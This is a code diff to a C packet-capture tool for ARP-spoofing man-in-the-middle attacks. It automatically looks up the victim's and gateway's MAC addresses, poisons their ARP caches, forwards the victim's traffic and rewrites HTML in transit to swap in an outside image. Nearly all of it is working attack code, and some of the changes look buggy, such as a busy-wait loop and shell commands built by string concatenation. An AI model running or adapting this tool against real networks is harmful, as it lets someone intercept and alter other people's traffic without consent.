@@ -26,18 +26,12 @@ void *retval;
 pthread_t thread1, thread2, thread3;
 int ret_thread1, ret_thread2, ret_thread3;
 
-/* send packet */
-void send_packet(pcap_t *handle, u_char *packet, int packetsize) {
-    if (pcap_sendpacket(handle, packet, packetsize) != 0)
-        printf("Packet send failed!\n");
-}
-
 /* send packet to gateway */
 void *startG(void *arg) {
     struct arg1 *real_arg = (struct arg1 *)arg;
     while (1) {
         send_packet(real_arg->handle, real_arg->packet, real_arg->size);
-        sleep(8);
+        sleep(10);
     }
     pthread_exit(NULL);
 }
@@ -47,21 +41,29 @@ void *startV(void *arg) {
     struct arg1 *real_arg = (struct arg1 *)arg;
     while (1) {
         send_packet(real_arg->handle, real_arg->packet, real_arg->size);
-        sleep(8);
+        sleep(10);
     }
     pthread_exit(NULL);
 }
 
 /* forward packet */
 void *startF(void *arg) {
+
+    /* receive parameter */
     struct arg2 *real_arg =(struct arg2 *)arg;
-    ethernet_header *pEther = (ethernet_header *)real_arg->packet;
+    u_char *packet = (u_char *)malloc(real_arg->size * sizeof(char));
+    memcpy(packet, real_arg->packet, real_arg->size);
+    ethernet_header *pEther = (ethernet_header *)packet;
     ip_header *pIpv4 = (ip_header *)pEther->data;
     tcp_header *pTcp = (tcp_header *)pIpv4->data;
+
+    /* forward packet straightly */
     if (!strncmp(pEther->SRC_mac, TARGET_MAC, 6) && !strncmp(pEther->DST_mac, ATTACKER_MAC, 6)) {
         memcpy(pEther->DST_mac, GATEWAY_MAC, 6);
-        send_packet(real_arg->handle, real_arg->packet, real_arg->size);
+        send_packet(real_arg->handle, packet, real_arg->size);
     }
+
+    /* modify html */
     else if (!strncmp(pEther->SRC_mac, GATEWAY_MAC, 6) && !strncmp(pIpv4->dest_ip, TARGET_IP, 4)) {
         memcpy(pEther->DST_mac, TARGET_MAC, 6);
         if (choose == 2)
@@ -70,7 +72,7 @@ void *startF(void *arg) {
         if (choose == 3)
             if (ntohs(pEther->eth_type) == EPT_IPv4 && pIpv4->type_of_service == PROTOCOL_TCP)
                 str_replace((char *)pTcp->data, "img src=", "img src=\"https://raw.githubusercontent.com/zxc479773533/HUA-JI-YOU/master/HUAJI.jpg\"");
-        send_packet(real_arg->handle, real_arg->packet, real_arg->size);
+        send_packet(real_arg->handle, packet, real_arg->size);
     }
 }
 
@@ -81,43 +83,7 @@ void getgateway(u_char *user, const struct pcap_pkthdr *hp, const u_char *packet
     printf("The gateway's MAC address is : ");
     print_mac(pEther->SRC_mac);
     memcpy(GATEWAY_MAC ,pEther->SRC_mac, 6);
-}
-
-/* create arp packet */
-void ARP_packet_build(u_char *ARPpacket, int packetsize,
-u_char *dst_mac, u_char *dst_ip, u_char *src_mac, u_char *src_ip, u_short op) {
-    ethernet_header ehead;
-    arp_header ahead;
-    memset(ARPpacket, 0, packetsize);
-    
-    /* about victim */
-    if (op == 1) { //ARP request
-        memset(ehead.DST_mac, 0xff, 6);
-        memset(ahead.dest_mac, 0x00, 6);
-        memset(ahead.dest_ip, 0, 4);
-    }
-    else { //ARP reply
-        memcpy(ehead.DST_mac, dst_mac, 6);
-        memcpy(ahead.dest_mac, dst_mac, 6);
-        memcpy(ahead.dest_ip, dst_ip, 4);
-    }
-    
-    /* about attacker */
-    memcpy(ehead.SRC_mac, src_mac, 6);
-    memcpy(ahead.src_mac, src_mac, 6);
-    memcpy(ahead.src_ip, src_ip, 4);
-    
-    /* others */
-    ehead.eth_type = htons((u_short)EPT_ARP);
-    ahead.hardware_type = htons((u_short)1);
-    ahead.protocol_type = htons((u_short)EPT_IPv4);
-    ahead.hardware_len = (u_char)6;
-    ahead.protocol_len = (u_char)4;
-    ahead.arp_option = htons((u_short)op);
-    
-    /* get together */
-    memcpy(ARPpacket, &ehead, sizeof(ehead));
-    memcpy(ARPpacket + sizeof(ehead), &ahead, sizeof(ahead));
+    printf("\n");
 }
 
 int main(int argc, char const *argv[]) {
@@ -132,8 +98,10 @@ int main(int argc, char const *argv[]) {
     struct in_addr addr_net;
     pcap_t *handle;
     u_char ARPpacket[42];
+    u_char ARPpacket_forvictim[42];
     u_char ARPpacket_forgateway[42];
     struct bpf_program filter;
+    char filter_app[100];
     int counter = 0;
     
     /* get and start device */
@@ -145,7 +113,7 @@ int main(int argc, char const *argv[]) {
     addr_net.s_addr = net_addr;
     net = inet_ntoa(addr_net);
     printf("Opening device\n");
-    handle = pcap_open_live(dev, 65536, 1, 1, errbuf);
+    handle = pcap_open_live(dev, 65536, 1, 0, errbuf);
     if (!handle) {
         printf("%s\n", errbuf);
         printf("If the Problem is \"you don't have permission\", please run this program as root!\n");
@@ -153,19 +121,46 @@ int main(int argc, char const *argv[]) {
     }
     loading();
 
-    /* get attack source */
-    printf("Please enter your victim's MAC (format: aa:aa:aa:aa:aa:aa)\n");
-    scanf("%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
-    &TARGET_MAC[0], &TARGET_MAC[1], &TARGET_MAC[2], &TARGET_MAC[3], &TARGET_MAC[4], &TARGET_MAC[5]);
+    /* get your mac */
+    printf("Getting your MAC\n");
+    int sockfd;
+    static struct ifreq req;
+    sockfd = socket(PF_INET, SOCK_DGRAM, 0);
+    strcpy(req.ifr_name, dev);
+    ioctl(sockfd, SIOCGIFHWADDR, &req);
+    loading();
+    printf("Your MAC is: ");
+    print_mac((u_char *)req.ifr_hwaddr.sa_data);
+    memcpy(ATTACKER_MAC, (u_char *)req.ifr_hwaddr.sa_data, 6);
+    printf("\n");
+
+    /* enter ip */
     printf("Please enter your victim's IP (format: 192.168.1.0)\n");
     scanf("%hhd.%hhd.%hhd.%hhd", &TARGET_IP[0], &TARGET_IP[1], &TARGET_IP[2], &TARGET_IP[3]);
-    printf("Please enter your MAC (format: aa:aa:aa:aa:aa:aa)\n");
-    scanf("%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
-    &ATTACKER_MAC[0], &ATTACKER_MAC[1], &ATTACKER_MAC[2], &ATTACKER_MAC[3], &ATTACKER_MAC[4], &ATTACKER_MAC[5]);
+
+    /* get attack resource */
+    printf("\nGetting your victim's MAC......\n");
+    char ip[20], ping[40] = "ping -c 3 >ping.txt ", arp[20] = "arp -e >arp.txt ", data[300];
+    sprintf(ip,"%d.%d.%d.%d", TARGET_IP[0], TARGET_IP[1], TARGET_IP[2], TARGET_IP[3]);
+    strcat(ping, ip), system(ping);
+    strcat(arp, ip), system(arp);
+    FILE* fp = fopen("arp.txt", "r");
+    fgets(data, 300, fp);
+    fgets(data, 300, fp);
+    char *p = strstr(data, "ether");
+    if (p == NULL) {
+        printf("Not found!\n");
+        exit(1);
+    }
+    get_mac(TARGET_MAC, p + 8);
+    printf("His MAC is: ");
+    print_mac(TARGET_MAC);
+    printf("\n");
+
 
     /* get gateway's mac */
     printf("Geting gateway's MAC\n");
-    char filter_app[100] = "src 192.168.1.1";
+    strcpy(filter_app, "src 192.168.1.1");
     pcap_compile(handle, &filter, filter_app, 0, *net);
     pcap_setfilter(handle, &filter);
     pcap_loop(handle, 1, getgateway, NULL);
@@ -205,7 +200,11 @@ int main(int argc, char const *argv[]) {
     scanf(" %d", &choose);
 
     /* four modes */
-    strcpy(filter_app, "");
+    char my_mac[20];
+    sprintf(my_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+    ATTACKER_MAC[0], ATTACKER_MAC[1], ATTACKER_MAC[2], ATTACKER_MAC[3], ATTACKER_MAC[4], ATTACKER_MAC[5]);
+    strcpy(filter_app, "not ether src ");
+    strcat(filter_app, my_mac);
     pcap_compile(handle, &filter, filter_app, 0, *net);
     pcap_setfilter(handle, &filter);
     while (1) {
@@ -216,6 +215,7 @@ int main(int argc, char const *argv[]) {
             forward_arg.pkthdr = pkt_header;
             forward_arg.size = pkt_header->caplen;
             pthread_create(&new_thread, NULL, (void *)startF, (void *)&forward_arg);
+            while(pkt_data);
         }
     }
 
